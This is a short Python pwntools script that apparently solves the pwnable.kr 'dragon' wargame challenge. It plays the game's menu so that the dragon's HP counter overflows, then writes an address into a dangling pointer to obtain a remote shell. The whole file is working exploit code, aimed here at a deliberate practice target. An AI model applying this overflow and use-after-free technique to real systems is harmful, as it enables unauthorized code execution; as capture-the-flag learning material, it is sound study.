#!/usr/bin/python

from pwn import *

t = remote('pwnable.kr', 9004)
#t = process('./dragon')
# we need to skip Baby Dragon
t.sendline('1') # priest
t.sendline('1') # holy bolt
t.sendline('1') # holy bolt

# lets fight Mama Dragon
t.sendline('1') # priest
# stay alive as long as possible to let dragon overflow his HP counter with HP regen
for i in range(0, 4):
    t.sendline('3') # holy shield
    t.sendline('3') # holy shield
    t.sendline('2') # clarity

t.sendline(packing.p32(0x08048DBF)) # dangling ptr - gimme shell

t.interactive()



